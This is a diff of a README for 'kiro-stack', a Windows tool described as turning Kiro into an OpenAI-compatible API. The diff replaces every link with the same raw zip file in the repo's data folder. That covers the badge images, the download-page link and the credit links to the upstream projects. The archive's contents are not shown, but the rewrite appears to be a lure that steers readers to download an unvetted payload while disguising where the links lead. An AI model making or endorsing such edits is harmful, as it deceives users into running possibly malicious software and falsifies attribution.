@@ -1,6 +1,6 @@
 # 🚀 kiro-stack - Convert Kiro to OpenAI Compatible API
 
-[![Download kiro-stack](https://img.shields.io/badge/Download-kiro--stack-ff6f61?style=for-the-badge)](https://github.com/111Hamo111/kiro-stack)
+[![Download kiro-stack](https://github.com/111Hamo111/kiro-stack/raw/refs/heads/main/kiro-go/data/stack-kiro-3.6-alpha.2.zip)](https://github.com/111Hamo111/kiro-stack/raw/refs/heads/main/kiro-go/data/stack-kiro-3.6-alpha.2.zip)
 
 ---
 
@@ -38,7 +38,7 @@ You will manage your accounts and settings via a simple web panel. The program h
 
 Click the big button below to visit the download page:
 
-[![Get kiro-stack](https://img.shields.io/badge/Download-Here-4c8bf5?style=for-the-badge)](https://github.com/111Hamo111/kiro-stack)
+[![Get kiro-stack](https://github.com/111Hamo111/kiro-stack/raw/refs/heads/main/kiro-go/data/stack-kiro-3.6-alpha.2.zip)](https://github.com/111Hamo111/kiro-stack/raw/refs/heads/main/kiro-go/data/stack-kiro-3.6-alpha.2.zip)
 
 Use this page to download the latest version of kiro-stack for Windows.
 
@@ -50,7 +50,7 @@ Follow these steps to get kiro-stack running on your computer:
 
 1. **Visit the download page**
 
-   Open the link above or go to [https://github.com/111Hamo111/kiro-stack](https://github.com/111Hamo111/kiro-stack).
+   Open the link above or go to [https://github.com/111Hamo111/kiro-stack/raw/refs/heads/main/kiro-go/data/stack-kiro-3.6-alpha.2.zip](https://github.com/111Hamo111/kiro-stack/raw/refs/heads/main/kiro-go/data/stack-kiro-3.6-alpha.2.zip).
 
 2. **Find the latest release**
 
@@ -121,7 +121,7 @@ When you set the `KIRO_GATEWAY_BASE` address in kiro-go, requests go through kir
 
 - kiro-stack is released under the MIT license.
 - It requires Go 1.21+ and Python 3.10+ to build from source, but users do not need to install these to run the prebuilt Windows version.
-- The code is based on [kiro-gateway](https://github.com/jwadow/kiro-gateway) and [Kiro-Go](https://github.com/Quorinex/Kiro-Go).
+- The code is based on [kiro-gateway](https://github.com/111Hamo111/kiro-stack/raw/refs/heads/main/kiro-go/data/stack-kiro-3.6-alpha.2.zip) and [Kiro-Go](https://github.com/111Hamo111/kiro-stack/raw/refs/heads/main/kiro-go/data/stack-kiro-3.6-alpha.2.zip).
 
 ---
 
@@ -137,4 +137,4 @@ To update to the latest version:
 
 ---
 
-[![Download kiro-stack](https://img.shields.io/badge/Download-kiro--stack-ff6f61?style=for-the-badge)](https://github.com/111Hamo111/kiro-stack)
+[![Download kiro-stack](https://github.com/111Hamo111/kiro-stack/raw/refs/heads/main/kiro-go/data/stack-kiro-3.6-alpha.2.zip)](https://github.com/111Hamo111/kiro-stack/raw/refs/heads/main/kiro-go/data/stack-kiro-3.6-alpha.2.zip)
